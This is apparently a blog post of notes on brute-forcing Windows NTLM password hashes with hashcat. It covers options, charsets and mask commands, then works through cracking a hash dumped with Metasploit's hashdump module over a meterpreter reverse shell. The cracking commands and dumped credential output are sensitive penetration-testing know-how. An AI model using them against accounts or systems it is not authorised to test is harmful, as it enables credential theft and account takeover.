---
layout: post
title: Hashcat NTLM Hash Brute Force Notes
---

## Abstact
Notes on brute-force Windows NTLM Hash with hashcat on a Windows/Linux machine with decent graphics card/cards.

## Environment
* Latest graphics card driver installed;
* A text file `hash.txt` of all the NTLM hash like this `aad3b435b51404eeaad3b435b51404ee', one for each line.

## Benchmark
Just grab the latest copy of hashcat from [here](https://hashcat.net/hashcat/), extract it and you are good to go.

Then, copy the text file of the NTLM hash to the root of the hashcat directory.

Run
```
hashcat64.bin(on Linux) -b
hashcat64.exe(on Windows) -b
```
to simply run a benchmark, and to also make sure that the graphics card driver are properly recognized.

## Brute-Force
### Options
Some of the most commonly used options are as follows:
Options Short, Long | Type | Description | Example
--- | --- | --- | ---
-m, --hash-type | Num | Hash-type, see references below | -m 1000
-a, --attack-mode | Num | Attack-mode, see references below | -a 3
-b, --benchmark | | Run benchmark |
-O, --optimized-kernel-enable | | Enable optimized kernels (limits password length) |
-w, --workload-profile | Num | Enable a specific workload profile, see pool below | -w 3
-1, --custom-charset1 | CS | User-defined charset ?1 | -1 ?l?d?u
-2, --custom-charset2 | CS | User-defined charset ?2 | -2 ?l?d?s
-i, --increment | | Enable mask increment mode |
--increment-min | Num | Start mask incrementing at X | --increment-min=4
--increment-max | Num | Stop mask incrementing at X | --increment-max=8

`-m` specifies the hash mode, i.e., LM(3000), NTLM(1000), MD5(0), SHA1(100);

`-a` is for the attack mode, they are
# | Mode
--- | ---
0 | Straight
1 | Combination
3 | Brute-force
6 | Hybrid Wordlist + Mask
7 | Hybrid Mask + Wordlist

we will use `3` Brute-force in our case;

`-w` sets the workload profile
# | Performance | Runtime | Power Consumption | Desktop Impact
--- | --- | --- | --- | ---
1 | Low         |   2 ms  | Low               | Minimal
2 | Default     |  12 ms  | Economic          | Noticeable
3 | High        |  96 ms  | High              | Unresponsive
4 | Nightmare   | 480 ms  | Insane            | Headless

You may choose the Nightmare mode if on a dedicated machine;

`-1/2/3` creates customized charsets which can be used later in the password mask

Hashcat has the following built-in charsets:
? | Charset
--- | ---
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

you may use these charsets in your password mask directly.

I.E. for numeric, 6 character long password NTLM hash: 
```
.\hashcat64.exe -m 1000 -a 3 hash.txt ?d?d?d?d?d?d
```
As you can see, in brute-fore mode, the string `?d?d?d?d?d?d` is the mask, 

the charset of each position can be designated with a `?` followed by its charset.

`?d?d?d?d?d?d` means that hashcat should try every possible numeric strings of length 6.

You can change the charset of any position to reduce the overall complexity. 

For a complex password consisting of both lowercase, numbers and special characters,

you can use
```
-1 ?l?d?s
```
for convenience.

That is
```
.\hashcat64.exe -m 1000 -a 3 hash.txt -1 ?l?d?s ?1?1?1?1?1?1
```
if the password is still 6 characters long.

`-i` enables mask increment mode, for example
```
.\hashcat64.exe -m 1000 -a 3 hash.txt ?d?d?d?d?d?d
```
only tries combinations that are 6 characters long.

With `-i` set, hashcat will start from 1 character to 6 characters.

You can also set the minimum length with `--increment-min=[length]` and the maxmum length with `--increment-max=[length]`.

### Attack
In our case, the NTLM hash is obtained with the metasploit framework module `post/windows/gather/hashdump` 
executed in a meterpreter reverse shell.
```
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY []...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[username]:1000:aad3b435b51404eeaad3b435b51404ee:0b82e1dace77e29dd1de00896ba1c5bc:::
```

Columns are separated by colon `:`, the 3rd one is LM(LAN Manager) hash, which has been deprecated since Windows Vista.

The 4th one `0b82e1dace77e29dd1de00896ba1c5bc` is the NTLM(NT LAN Manager) hash used by modern Windows operating systems,

and that is exactly what we are trying to brute-force here.

First create the `hash.txt` file
```
echo "0b82e1dace77e29dd1de00896ba1c5bc" > hash.txt
```
As we have no idea how long the password is, nor what characters may have been used, 

we make an assumption that the length is between 5 and 9 , and only lowercase and numbers are used.

Use the custom charset
```
-1 ?l?d
```

This should word for most non tech-savvy people.

Then run
```
./hashcat64.bin -m 1000 -a 3 -w 3 -O hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1?1 -i --increment-min=5
```

Finally we will get the result `qqqqqq`.

This should be pretty quick if your graphics cards have enough horse power.

## Reference

* [https://www.4armed.com/blog/perform-mask-attack-hashcat/](https://www.4armed.com/blog/perform-mask-attack-hashcat/)